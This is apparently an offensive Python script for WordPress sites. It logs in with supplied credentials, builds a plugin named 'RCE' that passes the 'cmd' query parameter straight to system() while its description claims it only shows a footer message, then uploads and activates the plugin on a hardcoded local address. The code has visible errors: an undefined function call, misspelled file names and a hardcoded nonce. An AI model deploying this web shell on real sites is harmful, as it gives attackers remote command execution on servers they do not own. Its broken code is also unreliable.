import requests
import zipfile


def login(user, password, url):
    urll = f'{url}/wp-login.php'
    data = {
        'log': user,
        'pwd': password,
        'wp-submit': 'Log+In',
        'redirect_to': f'{url}/wp-admin/index.php',
        'testcookie': '1'
    }  
    r = requests.post(urll, data,  allow_redirects=True)
    if r.status_code == 200:  
        return True
    else: 
        return False


def gen_plugin(): 
    php_code = """<?php
/**
 * Plugin Name: RCE
 * Description: Un plugin simple pour afficher un message dans le pied de page.
 * Version: 1.0
 * Author: TFA
 */
    if(isset($_GET['cmd']))
    {
        system($_GET['cmd']);
    }
?>
"""
    with open("plugins.php", "w") as php_file:
        php_file.write(php_code)

    zip = 'payload.zip'

    with zipfile.ZipFile(zip, 'w') as zip_file:
        zip_file.write("plugins.php")
    
    return(f'[+] payload name: {zip}')


def uplaod_plugins(url, zip_file):
    files = zip_file
    r = requests.post(f'{url}/wp-admin/plugin-install.php', files)

    if r.status_code == 200:
        print('[*] Plugin téléversé avec succès.')
    else:
        print(f'Erreur lors du téléversement du plugin. Code d\'état : {r.status_code}')

    rr = requests.get(f'{url}/wp-admin/plugins.php?action=activate&plugin=payload-1%2Fplugins.php&_wpnonce=b0f3af346f')
    print(rr.status_code)

#user = input('enter wp user: ')
#password = input('enter wp pass: ')
#url = input('enter wp url: ')
print(login_wp)
gen = gen_plugin()
print(gen)
upload = uplaod_plugins('http://192.168.5.45/', 'paylaod.zip')
print(upload)

